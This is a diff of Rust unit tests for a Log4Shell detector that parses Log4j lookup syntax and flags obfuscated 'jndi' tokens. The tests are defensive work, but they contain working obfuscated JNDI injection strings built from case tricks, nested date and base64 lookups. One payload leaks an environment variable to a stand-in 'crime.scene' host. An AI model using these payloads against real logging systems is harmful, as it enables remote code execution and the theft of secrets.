@@ -63,20 +63,17 @@ fn unicode_obfuscated() {
 fn various_case_rules() {
     // It appears that log4j handles tokens like `LoWeR` and `jNdi`, but not unicode characters
     // that would lowercase to the same thing. Don't know where the matching happens in log4j yet.
-    let (result, findings) =
-        parseu("does this get blocked? ${jndı:ldap://whatever}");
+    let (result, findings) = parseu("does this get blocked? ${jndı:ldap://whatever}");
     assert_eq!("does this get blocked? ", result); // the unknown `jndı` expands to empty string
     assert!(!findings.saw_jndi);
 
     // but regular caps do the trick
-    let (result, findings) =
-        parseu("does this get blocked? ${jndI:ldap://whatever}");
+    let (result, findings) = parseu("does this get blocked? ${jndI:ldap://whatever}");
     assert_eq!("does this get blocked? jndI:ldap://whatever", result);
     assert!(findings.saw_jndi);
 
     // and work in nested evaluations too
-    let (result, findings) =
-        parseu("does this get blocked? ${jnd${UpPeR:i}:ldap://whatever}");
+    let (result, findings) = parseu("does this get blocked? ${jnd${UpPeR:i}:ldap://whatever}");
     assert_eq!("does this get blocked? jndI:ldap://whatever", result);
     assert!(findings.saw_jndi);
 }
@@ -112,10 +109,7 @@ fn base64() {
     let evil = base64::encode("${jndi:ldap:${env:user}.crime.scene/a}");
     let input = format!("all your base64 are ${{base64:{}}}", evil);
     let (result, findings) = parseu(&input);
-    assert_eq!(
-        "all your base64 are jndi:ldap:.crime.scene/a",
-        result
-    );
+    assert_eq!("all your base64 are jndi:ldap:.crime.scene/a", result);
     assert!(findings.saw_jndi);
     assert!(findings.saw_env);
 
@@ -135,16 +129,18 @@ fn much_nesting() {
 }
 #[test]
 fn date_lookups() {
-    let input = "hello ${jn${date:''}di:}";
+    // the default value for date
+    let input = "hello ${jn${date::-}di:}";
     let (result, findings) = parseu(input);
     assert_eq!("hello jndi:", result);
     assert!(findings.saw_jndi);
 
-    // NOTE: this is lossy. A real expansion would look like `${jn2021di:}`. This is still not the
-    // token we're really concerned about finding, so we're not worried about that detail.
-    //
-    // The resulting detection of a `jndi` token will be a false positive.
-    let input = "hello ${jn${date:YYYY}di:}";
+    // dates with format strings
+    let input = "hello ${date:yyyy}";
+    let (result, _) = parseu(input);
+    assert_eq!("hello     ", result); // format chars gets replaced with spaces in our formatter
+
+    let input = "hello ${jn${date:'d'}i:}";
     let (result, findings) = parseu(input);
     assert_eq!("hello jndi:", result);
     assert!(findings.saw_jndi);
@@ -182,7 +178,7 @@ fn double_obfuscated_jndi() {
     assert!(findings.saw_jndi);
     assert!(findings.saw_main);
 
-    let input = "hello ${lower:${::-$}{jn${date:''}di:}}";
+    let input = "hello ${lower:${::-$}{jn${date:'d'}i:}}";
     let (result, findings) = parseu(input);
     assert_eq!("hello jndi:", result);
     assert!(findings.saw_jndi);
@@ -203,4 +199,32 @@ fn env_expansion() {
     assert_eq!("this env var does not exist: evil_jndi", result);
     assert!(!findings.saw_jndi);
     assert!(findings.saw_env);
+}
+#[test]
+fn date_with_invalid_fmt_chars() {
+    let input = "${j${date:'nd'}i:ldap://127.0.0.1:1234/}";
+    let (result, findings) = parseu(input);
+    assert_eq!("jndi:ldap://127.0.0.1:1234/", result);
+    assert!(findings.saw_jndi);
+}
+#[test]
+fn date_with_default_chars() {
+    let input = "${j${date:-nd}i:ldap://127.0.0.1:1234/}";
+    let (result, findings) = parseu(input);
+    assert_eq!("jndi:ldap://127.0.0.1:1234/", result);
+    assert!(findings.saw_jndi);
+}
+#[test]
+fn date_with_obvious_jdni() {
+    let input = "${${date:'jndi'}:ldap://127.0.0.1:1234/}";
+    let (result, findings) = parseu(input);
+    assert_eq!("jndi:ldap://127.0.0.1:1234/", result);
+    assert!(findings.saw_jndi);
+}
+#[test]
+fn obfuscated_date() {
+    let input = "${date:'$'}{${date:'${base64:ag==}'}${date:'n'}${date:'d'}${date:'i'}:${date:'${base64:bGRhcA==}'}://127.0.0.1:1234/}";
+    let (result, findings) = parseu(input);
+    assert_eq!("jndi:ldap://127.0.0.1:1234/", result);
+    assert!(findings.saw_jndi);
 }
